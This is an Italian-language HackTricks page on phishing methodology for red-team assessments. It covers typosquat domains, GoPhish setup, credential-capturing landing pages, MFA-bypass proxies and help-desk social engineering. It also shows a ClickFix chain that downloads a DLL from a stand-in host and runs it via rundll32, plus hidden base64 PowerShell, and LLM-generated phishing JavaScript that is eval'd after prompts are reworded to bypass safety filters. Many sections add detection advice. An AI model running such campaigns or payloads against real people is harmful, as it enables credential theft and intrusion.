# Metodologia di Phishing

{{#include ../../banners/hacktricks-training.md}}

## Metodologia

1. Ricognizione della vittima
1. Seleziona il **dominio della vittima**.
2. Esegui una enumerazione web di base **cercando i portali di login** usati dalla vittima e **decidi** quale intendi **impersonare**.
3. Usa un po' di **OSINT** per **trovare email**.
2. Prepara l'ambiente
1. Acquista il **dominio** che userai per il test di phishing
2. Configura i record correlati al servizio email (SPF, DMARC, DKIM, rDNS)
3. Configura il VPS con **gophish**
3. Prepara la campagna
1. Prepara il **template dell'email**
2. Prepara la **pagina web** per rubare le credenziali
4. Lancia la campagna!

## Generare nomi di dominio simili o acquistare un dominio affidabile

### Tecniche di variazione del nome di dominio

- **Keyword**: Il nome di dominio **contiene** una **parola chiave** importante del dominio originale (e.g., zelster.com-management.com).
- **hypened subdomain**: Sostituisci il **punto con un trattino** in un sottodominio (e.g., www-zelster.com).
- **New TLD**: Stesso dominio usando una **nuova TLD** (e.g., zelster.org)
- **Homoglyph**: Sostituisce una lettera nel nome di dominio con **lettere che assomigliano** (e.g., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Scambia due lettere all'interno del nome di dominio (e.g., zelsetr.com).
- **Singularization/Pluralization**: Aggiunge o rimuove la “s” alla fine del nome di dominio (e.g., zeltsers.com).
- **Omission**: Rimuove una delle lettere dal nome di dominio (e.g., zelser.com).
- **Repetition:** Ripete una delle lettere nel nome di dominio (e.g., zeltsser.com).
- **Replacement**: Simile a homoglyph ma meno stealthy. Sostituisce una delle lettere nel nome di dominio, magari con una lettera vicina sulla tastiera (e.g, zektser.com).
- **Subdomained**: Introduce un **punto** all'interno del nome di dominio (e.g., ze.lster.com).
- **Insertion**: Inserisce una lettera nel nome di dominio (e.g., zerltser.com).
- **Missing dot**: Aggiunge la TLD al nome di dominio. (e.g., zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Esiste la **possibilità che uno o più bit memorizzati o in comunicazione vengano automaticamente invertiti** a causa di vari fattori come brillamenti solari, raggi cosmici o errori hardware.

Quando questo concetto è **applicato alle richieste DNS**, è possibile che il **dominio ricevuto dal server DNS** non sia lo stesso del dominio inizialmente richiesto.

Ad esempio, una singola modifica di bit nel dominio "windows.com" può cambiarlo in "windnws.com."

Gli attacker possono **sfruttare questo registrando più domini affetti da bit-flipping** simili al dominio della vittima. L'intento è reindirizzare utenti legittimi alla loro infrastruttura.

Per maggiori informazioni leggi [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Buy a trusted domain

Puoi cercare su [https://www.expireddomains.net/](https://www.expireddomains.net) un dominio scaduto che potresti usare.\
Per assicurarti che il dominio scaduto che intendi acquistare **abbia già un buon SEO** puoi verificare come è categorizzato in:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Scoperta delle email

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Per **scoprire più** indirizzi email validi o **verificare quelli** che hai già trovato puoi provare a brute-forzarli contro i server SMTP della vittima. [Scopri come verificare/scoprire indirizzi email qui](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Inoltre, non dimenticare che se gli utenti usano **un qualsiasi portale web per accedere alle loro mail**, puoi verificare se è vulnerabile al **brute force sullo username**, ed eventualmente sfruttare la vulnerabilità.

## Configuring GoPhish

### Installation

Puoi scaricarlo da [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Scaricalo e decomprimilo in `/opt/gophish` ed esegui `/opt/gophish/gophish`\
Ti verrà fornita una password per l'utente admin per la porta 3333 nell'output. Di conseguenza, accedi a quella porta e usa quelle credenziali per cambiare la password admin. Potrebbe essere necessario effettuare un tunnel di quella porta in locale:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Configurazione

**Configurazione del certificato TLS**

Prima di questo passaggio dovresti aver **già acquistato il dominio** che intendi usare e deve essere **indirizzato** all'**IP del VPS** dove stai configurando **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Configurazione mail**

Avvia l'installazione: `apt-get install postfix`

Poi aggiungi il dominio ai seguenti file:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Modifica anche i valori delle seguenti variabili all'interno di /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Infine modifica i file **`/etc/hostname`** e **`/etc/mailname`** con il nome del tuo dominio e **riavvia il tuo VPS.**

Ora crea un **DNS A record** di `mail.<domain>` che punti all'**indirizzo IP** del VPS e un **DNS MX** record che punti a `mail.<domain>`

Ora testiamo l'invio di un'email:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish configuration**

Ferma l'esecuzione di gophish e configuriamolo.\
Modifica `/opt/gophish/config.json` come segue (nota l'uso di https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Configura gophish service**

Per creare il gophish service in modo che possa essere avviato automaticamente e gestito come servizio, puoi creare il file `/etc/init.d/gophish` con il seguente contenuto:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Completa la configurazione del servizio e verifica che funzioni:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Configurazione del mail server e del dominio

### Aspetta e sii legittimo

Più un dominio è vecchio, meno probabile è che venga identificato come spam. Dovresti quindi aspettare il più possibile (almeno 1 settimana) prima della valutazione di phishing. Inoltre, se pubblichi una pagina relativa a un settore con buona reputazione, la reputazione ottenuta sarà migliore.

Nota che anche se devi aspettare una settimana, puoi comunque completare la configurazione di tutto adesso.

### Configura il record Reverse DNS (rDNS)

Imposta un record rDNS (PTR) che risolva l'indirizzo IP del VPS nel nome di dominio.

### Record SPF (Sender Policy Framework)

Devi **configurare un SPF record per il nuovo dominio**. Se non sai cos'è un SPF record [**leggi questa pagina**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Puoi usare [https://www.spfwizard.net/](https://www.spfwizard.net) per generare la tua SPF policy (usa l'IP della macchina VPS)

![](<../../images/image (1037).png>)

Questo è il contenuto che deve essere inserito in un record TXT nel dominio:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Record DMARC (Autenticazione dei messaggi basata sul dominio, reporting e conformità)

Devi **configurare un record DMARC per il nuovo dominio**. Se non sai cos'è un record DMARC [**leggi questa pagina**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Devi creare un nuovo record DNS TXT che punti all'hostname `_dmarc.<domain>` con il seguente contenuto:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Devi **configurare un DKIM per il nuovo dominio**. Se non sai cos'è un record DMARC [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Questo tutorial si basa su: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> Devi concatenare entrambi i valori B64 che la chiave DKIM genera:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Verifica il punteggio della configurazione email

Puoi farlo usando [https://www.mail-tester.com/](https://www.mail-tester.com/)\  
Accedi alla pagina e invia un'email all'indirizzo che ti forniscono:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Puoi anche **verificare la configurazione della tua email** inviando una email a `check-auth@verifier.port25.com` e **leggere la risposta** (per questo dovrai **aprire** la porta **25** e vedere la risposta nel file _/var/mail/root_ se invii l'email come root).\
Verifica di superare tutti i test:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Puoi anche inviare un **messaggio a una Gmail sotto il tuo controllo** e controllare i **header dell'email** nella tua casella Gmail: `dkim=pass` dovrebbe essere presente nel campo `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Rimozione dalla Blacklist di Spamhouse

La pagina [www.mail-tester.com](https://www.mail-tester.com) può indicare se il tuo dominio è bloccato da Spamhouse. Puoi richiedere la rimozione del tuo dominio/IP su: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Rimozione dalla Blacklist Microsoft

​​Puoi richiedere la rimozione del tuo dominio/IP su [https://sender.office.com/](https://sender.office.com).

## Creare e lanciare una campagna GoPhish

### Profilo di invio

- Imposta un **nome identificativo** per il profilo del mittente
- Decidi da quale account invierai le email di phishing. Suggerimenti: _noreply, support, servicedesk, salesforce..._
- Puoi lasciare vuoti username e password, ma assicurati di selezionare Ignore Certificate Errors

![](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> È consigliabile usare la funzionalità "**Send Test Email**" per verificare che tutto funzioni.\
> Consiglio di **inviare le email di test a indirizzi 10min mails** per evitare di essere inseriti in blacklist durante i test.

### Modello email

- Imposta un **nome identificativo** per il template
- Poi scrivi un **oggetto** (niente di strano, qualcosa che ti aspetteresti di leggere in una email normale)
- Assicurati di avere selezionato "**Add Tracking Image**"
- Scrivi il **modello dell'email** (puoi usare variabili come nell'esempio seguente):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Nota che **per aumentare la credibilità dell'email**, è consigliato usare qualche firma presa da un'email del cliente. Suggerimenti:

- Invia un'email a un **indirizzo inesistente** e verifica se la risposta contiene qualche firma.
- Cerca **email pubbliche** come info@ex.com o press@ex.com o public@ex.com e invia loro un'email, poi aspetta la risposta.
- Prova a contattare **un indirizzo valido scoperto** e aspetta la risposta.

![](<../../images/image (80).png>)

> [!TIP]
> The Email Template permette anche di **allegare file da inviare**. Se vuoi anche rubare challenge NTLM usando file/documenti appositamente creati [leggi questa pagina](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Inserisci un **nome**
- **Scrivi il codice HTML** della pagina web. Nota che puoi **importare** pagine web.
- Seleziona **'Capture Submitted Data'** e **'Capture Passwords'**
- Imposta una **redirection**

![](<../../images/image (826).png>)

> [!TIP]
> Di solito dovrai modificare il codice HTML della pagina e fare dei test in locale (magari usando un server Apache) **finché non ottieni il risultato desiderato.** Poi incolla quel codice HTML nella casella.\
> Nota che se hai bisogno di **risorse statiche** per l'HTML (ad esempio CSS o JS) puoi salvarle in _**/opt/gophish/static/endpoint**_ e poi accedervi da _**/static/\<filename>**_

> [!TIP]
> Per la redirection potresti **reindirizzare gli utenti alla pagina principale legittima** della vittima, oppure reindirizzarli a _/static/migration.html_ per esempio, mostrare una **ruota che gira** ([https://loading.io/](https://loading.io)) per 5 secondi e poi indicare che il processo è stato completato con successo.

### Users & Groups

- Imposta un nome
- **Import the data** (nota che per usare il template d'esempio ti servono firstname, last name e email address di ogni utente)

![](<../../images/image (163).png>)

### Campaign

Infine, crea una campaign selezionando un nome, l'email template, la landing page, l'URL, il sending profile e il gruppo. Nota che l'URL sarà il link inviato alle vittime.

Nota che il **Sending Profile permette di inviare un'email di test per vedere come apparirà l'email di phishing finale**:

![](<../../images/image (192).png>)

> [!TIP]
> Consiglio di **inviare le email di test a indirizzi 10min mails** per evitare di essere inseriti in blacklist durante i test.

Quando tutto è pronto, lancia la campaign!

## Website Cloning

Se per qualsiasi motivo vuoi clonare il sito web, controlla la pagina seguente:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

In alcuni assessment di phishing (principalmente per Red Teams) vorrai anche **inviare file contenenti qualche tipo di backdoor** (magari un C2 o semplicemente qualcosa che scateni un'autenticazione).\
Dai un'occhiata alla pagina seguente per alcuni esempi:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

L'attacco precedente è piuttosto astuto in quanto stai falsificando un sito reale e raccogliendo le informazioni inserite dall'utente. Purtroppo, se l'utente non inserisce la password corretta o se l'applicazione che hai finto è configurata con 2FA, **queste informazioni non ti permetteranno di impersonare l'utente ingannato**.

Qui entrano in gioco strumenti come [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) e [**muraena**](https://github.com/muraenateam/muraena). Questi tool consentono di generare un attacco MitM. Fondamentalmente, l'attacco funziona così:

1. Tu **impersoni il form di login** della pagina reale.
2. L'utente **invia** le sue **credenziali** alla tua pagina fake e lo strumento le inoltra alla pagina reale, **verificando se le credenziali sono valide**.
3. Se l'account è configurato con **2FA**, la pagina MitM richiederà il codice e, una volta che **l'utente lo inserisce**, lo strumento lo invierà alla pagina reale.
4. Quando l'utente è autenticato tu (come attacker) avrai **catturato le credenziali, il 2FA, il cookie e qualsiasi informazione** di ogni interazione mentre lo strumento esegue il MitM.

### Via VNC

E se invece di **inviare la vittima a una pagina malevola** con lo stesso aspetto dell'originale, la mandassi a una **sessione VNC con un browser connesso alla pagina reale**? Saresti in grado di vedere cosa fa, rubare la password, la MFA usata, i cookie...\
Puoi farlo con [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Detecting the detection

Ovviamente uno dei modi migliori per sapere se sei stato scoperto è **cercare il tuo dominio nelle blacklist**. Se risulta presente, in qualche modo il tuo dominio è stato rilevato come sospetto.\
Un modo semplice per verificare se il tuo dominio compare in qualche blacklist è usare [https://malwareworld.com/](https://malwareworld.com)

Tuttavia, ci sono altri modi per capire se la vittima sta **attivamente cercando attività di phishing sospette** come spiegato in:


{{#ref}}
detecting-phising.md
{{#endref}}

Puoi **comprare un dominio con un nome molto simile** a quello della vittima **e/o generare un certificato** per un **sottodominio** di un dominio controllato da te **contenente** la **keyword** del dominio della vittima. Se la **vittima** compie qualsiasi tipo di interazione DNS o HTTP con essi, saprai che **sta cercando attivamente** domini sospetti e dovrai essere molto stealth.

### Evaluate the phishing

Usa [**Phishious**](https://github.com/Rices/Phishious) per valutare se la tua email finirà nella cartella spam, sarà bloccata o avrà successo.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Modern intrusion sets sempre più spesso saltano completamente le email di esca e **mirano direttamente al workflow del service-desk / identity-recovery** per sconfiggere la MFA. L'attacco è completamente "living-off-the-land": una volta che l'operatore possiede credenziali valide pivotano con strumenti amministrativi incorporati – nessun malware è richiesto.

### Attack flow
1. Recon della vittima
* Raccogli dettagli personali e aziendali da LinkedIn, data breaches, GitHub pubblico, ecc.
* Identifica identità ad alto valore (executives, IT, finance) ed enumera il **processo esatto di help-desk** per reset di password / MFA.
2. Social engineering in tempo reale
* Telefonare, usare Teams o chat con l'help-desk fingendo di essere la vittima (spesso con **spoofed caller-ID** o **cloned voice**).
* Fornire le PII raccolte in precedenza per superare la verifica basata su conoscenza.
* Convincere l'agente a **resettare il secret MFA** o effettuare un **SIM-swap** su un numero mobile registrato.
3. Azioni immediate post-accesso (≤60 min in casi reali)
* Stabilire un foothold tramite qualsiasi web SSO portal.
* Enumerare AD / AzureAD con gli strumenti di sistema (senza droppare binari):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Movimento laterale con **WMI**, **PsExec**, o agenti legittimi **RMM** già whitelisted nell'ambiente.

### Detection & Mitigation
* Tratta il recovery dell'identità tramite help-desk come un'operazione **privilegiata** – richiedi step-up auth & approvazione del manager.
* Distribuisci regole **Identity Threat Detection & Response (ITDR)** / **UEBA** che generino alert su:
* Metodo MFA cambiato + autenticazione da nuovo dispositivo / geo.
* Immediata elevazione dello stesso principale (user-→-admin).
* Registra le chiamate all'help-desk ed esegui un **call-back a un numero già registrato** prima di qualsiasi reset.
* Implementa **Just-In-Time (JIT) / Privileged Access** in modo che gli account appena resettati non ereditino automaticamente token ad alto privilegio.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Gruppi commodity compensano il costo delle operazioni high-touch con attacchi di massa che trasformano **motori di ricerca & reti pubblicitarie nel canale di consegna**.

1. **SEO poisoning / malvertising** spinge un risultato fake come `chromium-update[.]site` in cima agli annunci di ricerca.
2. La vittima scarica un piccolo **first-stage loader** (spesso JS/HTA/ISO). Esempi osservati da Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Il loader esfiltra cookie del browser + DB delle credenziali, poi scarica un **silent loader** che decide – *in tempo reale* – se distribuire:
* RAT (es. AsyncRAT, RustDesk)
* ransomware / wiper
* componente di persistenza (Run key del registro + scheduled task)

### Hardening tips
* Blocca domini appena registrati e applica **Advanced DNS / URL Filtering** su *search-ads* così come sulle email.
* Restringi l'installazione software a pacchetti MSI firmati / Store, nega l'esecuzione di `HTA`, `ISO`, `VBS` tramite policy.
* Monitora i processi figli dei browser che aprono installer:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Caccia i LOLBins frequentemente abusati dai first-stage loader (es. `regsvr32`, `curl`, `mshta`).

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: advisory clonata di un CERT nazionale con un pulsante **Update** che mostra istruzioni passo-passo per la “fix”. Le vittime sono invitate a eseguire un batch che scarica una DLL ed la esegue tramite `rundll32`.
* Tipica catena batch osservata:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` deposita il payload in `%TEMP%`, una breve pausa nasconde il jitter di rete, poi `rundll32` invoca l'entrypoint esportato (`notepad`).
* La DLL beaconizza l'identità dell'host e fa polling al C2 ogni pochi minuti. I task remoti arrivano come **PowerShell codificato in base64** eseguito in modo nascosto e con bypass delle policy:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Questo preserva la flessibilità del C2 (il server può cambiare i task senza aggiornare la DLL) e nasconde le finestre della console. Cerca processi PowerShell figli di `rundll32.exe` con `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` insieme.
* I difensori possono cercare callback HTTP(S) del tipo `...page.php?tynor=<COMPUTER>sss<USER>` e intervalli di polling di 5 minuti dopo il caricamento della DLL.

---

## AI-Enhanced Phishing Operations
Gli attacker ora concatenano **LLM & voice-clone APIs** per esche completamente personalizzate e interazioni in tempo reale.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Generate & send >100 k emails / SMS with randomised wording & tracking links.|
|Generative AI|Produce *one-off* emails referencing public M&A, inside jokes from social media; deep-fake CEO voice in callback scam.|
|Agentic AI|Autonomously register domains, scrape open-source intel, craft next-stage mails when a victim clicks but doesn’t submit creds.|

**Defence:**
• Aggiungi **banner dinamici** che evidenzino i messaggi inviati da automazioni non fidate (tramite anomalie ARC/DKIM).  
• Implementa **challenge biometrici vocali** per richieste telefoniche ad alto rischio.  
• Simula continuamente esche generate da AI nei programmi di awareness – i template statici sono obsoleti.

Vedi anche – agentic browsing abuse per credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Vedi anche – AI agent abuse of local CLI tools and MCP (per inventario di segreti e detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Gli attacker possono spedire HTML dall'aspetto innocuo e **generare lo stealer a runtime** chiedendo a una **trusted LLM API** del JavaScript, quindi eseguirlo in-browser (es. `eval` o `<script>` dinamico).

1. **Prompt-as-obfuscation:** codifica URL di esfiltrazione/stringhe Base64 nel prompt; iterare il wording per bypassare i filtri di sicurezza e ridurre le hallucinations.
2. **Client-side API call:** al caricamento, il JS chiama un LLM pubblico (Gemini/DeepSeek/etc.) o un proxy CDN; solo il prompt/chiamata API è presente nell'HTML statico.
3. **Assemble & exec:** concatena la risposta ed eseguila (polimorfico per visita):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** il codice generato personalizza l'esca (ad es., LogoKit token parsing) e invia le creds all'endpoint nascosto nel prompt.

**Caratteristiche di evasione**
- Il traffico raggiunge domini LLM noti o proxy CDN reputabili; a volte tramite WebSockets verso un backend.
- Nessun payload statico; il JS malevolo esiste solo dopo il render.
- Generazioni non deterministiche producono **stealers** unici per sessione.

**Idee per il rilevamento**
- Esegui sandbox con JS abilitato; segnala **runtime `eval`/creazione dinamica di script proveniente da risposte LLM**.
- Cerca POSTs front-end verso le API LLM immediatamente seguiti da `eval`/`Function` sul testo restituito.
- Genera allerta su domini LLM non autorizzati nel traffico client e sui successivi POSTs di credenziali.

---

## Variante MFA Fatigue / Push Bombing – Forced Reset
Oltre al classico push-bombing, gli operatori semplicemente **forzano una nuova registrazione MFA** durante la chiamata al help-desk, annullando il token esistente dell'utente. Qualsiasi successiva richiesta di login appare legittima alla vittima.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitorare eventi AzureAD/AWS/Okta in cui **`deleteMFA` + `addMFA`** si verificano **entro pochi minuti dallo stesso IP**.



## Clipboard Hijacking / Pastejacking

Attaccanti possono copiare silenziosamente comandi malevoli negli appunti della vittima da una pagina web compromessa o typosquattata e poi indurre l'utente a incollarli in **Win + R**, **Win + X** o in una finestra terminale, eseguendo codice arbitrario senza alcun download o allegato.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Romance-gated APK + WhatsApp pivot (dating-app lure)
* L'APK incorpora credenziali statiche e per-profile “unlock codes” (no server auth). Le vittime seguono un falso flusso di esclusività (login → profili bloccati → sblocca) e, con i codici corretti, vengono reindirizzate in chat WhatsApp con numeri controllati dall'attaccante `+92` mentre lo spyware gira silenziosamente.
* La raccolta inizia anche prima del login: esfiltrazione immediata di **device ID**, contatti (come `.txt` dalla cache) e documenti (immagini/PDF/Office/OpenXML). Un content observer carica automaticamente le nuove foto; un scheduled job riesegue la scansione per nuovi documenti ogni **5 minuti**.
* Persistenza: si registra per `BOOT_COMPLETED` e mantiene un **foreground service** attivo per sopravvivere a riavvii e terminazioni in background.

### WhatsApp device-linking hijack via QR social engineering
* Una pagina esca (es. un falso “channel” del ministero/CERT) mostra un QR per WhatsApp Web/Desktop e istruisce la vittima a scannerizzarlo, aggiungendo silenziosamente l'attaccante come **linked device**.
* L'attaccante ottiene immediatamente visibilità di chat/contatti finché la sessione non viene rimossa. Le vittime possono poi vedere una notifica “new device linked”; i difensori possono cercare eventi di device-link inaspettati poco dopo visite a pagine QR non affidabili.

### Mobile‑gated phishing to evade crawlers/sandboxes
Operatori nascondono sempre più spesso i loro flussi di phishing dietro un semplice controllo del dispositivo così i crawler desktop non raggiungono mai le pagine finali. Un pattern comune è un piccolo script che verifica la presenza di un DOM touch-capable e invia il risultato a un endpoint server; i client non‑mobile ricevono HTTP 500 (o una pagina vuota), mentre gli utenti mobile ricevono il flusso completo.

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` logica (semplificata):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Comportamento del server spesso osservato:
- Imposta un cookie di sessione durante il primo caricamento.
- Accetta `POST /detect {"is_mobile":true|false}`.
- Risponde con 500 (o placeholder) alle GET successive quando `is_mobile=false`; serve phishing solo se `true`.

Hunting and detection heuristics:
- urlscan query: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: sequenza di `GET /static/detect_device.js` → `POST /detect` → HTTP 500 per non‑mobile; i percorsi legittimi per vittime mobile ritornano 200 con HTML/JS successivo.
- Bloccare o esaminare con attenzione pagine che condizionano il contenuto esclusivamente su `ontouchstart` o controlli simili del dispositivo.

Consigli di difesa:
- Eseguire crawler con fingerprint simili a dispositivi mobili e JS abilitato per rivelare contenuti condizionati.
- Segnalare risposte 500 sospette che seguono `POST /detect` su domini appena registrati.

## Riferimenti

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
